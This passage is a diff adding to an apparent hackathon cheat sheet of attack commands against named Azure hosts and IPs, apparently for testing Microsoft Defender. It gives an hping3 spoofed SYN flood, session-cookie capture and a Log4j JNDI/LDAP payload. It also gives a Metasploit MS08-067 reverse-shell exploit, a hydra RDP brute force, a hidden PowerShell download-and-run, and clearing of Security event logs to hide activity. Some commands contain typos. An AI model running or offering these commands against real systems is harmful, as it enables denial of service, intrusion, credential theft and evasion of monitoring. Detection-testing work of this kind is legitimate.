@@ -44,4 +44,125 @@ curl -u user:pass -o outfile https://owaspdirect-prunoavl6xr2y.azurewebsites.net
 hping3 52.249.241.69  --flood --frag --spoof 20.185.179.183 --destport 443 –syn 
 ```
 
+![image](https://user-images.githubusercontent.com/97529152/161604741-1f755fd1-3780-406f-8b60-c190741ad160.png)
 
+**NOTE:**
+This will run without notifications to you so that you can continue to hack.  
+
+### Capture session Tokens…works on live websites 
+```
+wget -q --save-cookies=cookie.txt --keep-session-cookies --post-data="username:admin&password=pass&Login=Login" https://owaspdirect-prunoavl6xr2y.azurewebsites.net/login.php 
+```
+ 
+**NOTE:**
+This works to capture live sessions if the website is active 
+
+### Output Website into HMTL for review and data grab 
+```
+curl https://owaspdirect-prunoavl6xr2y.azurewebsites.net/file[1-10].txt 
+```
+![image](https://user-images.githubusercontent.com/97529152/161605398-78fcd307-42c4-4d52-b970-9bf477e62bf7.png)
+
+### Log4j Attempt 
+```
+curl 52.249.241.69:443 -H X-Api-Version:" ${jndi:ldap://52.249.241.69/a}"localhost:8080 
+curl 52.249.241.69:80 -H X-Api-Version:" ${jndi:ldap://52.249.241.69/a}"localhost:8080 
+```
+ 
+### Metasploit SMB attack 
+```
+sudo msfdb init && msfconsole 
+```
+![image](https://user-images.githubusercontent.com/97529152/161608402-5e6ae3c2-b2c1-43b4-91fd-47c4b0166928.png)
+
+then search ms08-067
+
+![image](https://user-images.githubusercontent.com/97529152/161608672-45c06997-e740-45b5-bf15-0391b6e1ccee.png)
+
+use exploit/windows/smb/ms08_067_netapi 
+show options 
+
+![image](https://user-images.githubusercontent.com/97529152/161608915-ac9cc02b-b8ef-4aa7-88cc-2fcecb7224e2.png)
+```
+set RHOST <Server IP> 
+set LHOST 10.1.0.4 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set ENCODER x86/shikata_ga_nai
+exploit
+```
+
+![image](https://user-images.githubusercontent.com/97529152/161609158-d23f30ca-ba25-421e-98fd-2b7dac49e667.png)
+
+### Output Website information 
+```
+cutycapt --url=https://owaspdirect-prunoavl6xr2y.azurewebsites.net --out= azurewebsites.cer –insecure 
+```
+
+## Server Attack
+
+GIVEN 
+Server Info 
+```
+20.127.240.125 
+20.127.240.160 
+```
+ 
+### BruteForce Servers 
+```
+cd /usr/share/wordlists 
+gzip -d rockyou.txt.gz //if not already unzipped 
+head -n 1000 rockyou.txt > user.txt 
+head -n 1000 rockyou.txt > pass.txt 
+```
+![image](https://user-images.githubusercontent.com/97529152/161609807-7d75972d-7d9e-44d1-932c-a9d595313840.png)
+```
+nano rockyou.txt 
+add: 
+Rudnei 
+Rudnei.com 
+Hackathon 
+hack 
+Adminuser 
+Testuser 
+admin 
+```
+Ssave once complete
+
+![image](https://user-images.githubusercontent.com/97529152/161610136-53e2d5b2-4e43-41e5-8974-1b6dba8fd31f.png)
+```
+hydra -I -L user.txt -P pass.txt <IP of the VictimPC> -t 4 rdp 
+```
+![image](https://user-images.githubusercontent.com/97529152/161610292-6654ed97-6013-4ee3-9e92-3a07878ee1cd.png)
+
+**NOTE:**
+This will take some time but it will start to output soon as it finds a viable user and/or password that can be triggered against a combination.  
+
+### Download File Hash simulation 
+```
+Nslookup www.eicar.org 
+(new-object system.net.weblcient).downloadfile(“http://www.eicar.org/download/eicar.com”, “desktop”) 
+``` 
+
+### Testing App Locker  
+```
+regsvr32.exe /s /u /i:test.sct Microsoft.Web.Deployment.Tracing.dll 
+```
+**NOTE:**
+Run this on a Machine connected to Defender for Cloud through agent Services 
+ 
+
+### Defender for Endpoint and Defender for Cloud remote Shell execution 
+```
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe' 
+```
+
+**NOTE:**
+On the Windows machine connected to MDE and MDC run: 
+
+ 
+
+### Clear Security Event Logs (Obfuscation techniques) 
+```
+Get-Eventlog -list 
+Clear-Eventlog -logname Security -computername <Server Name> 
+```
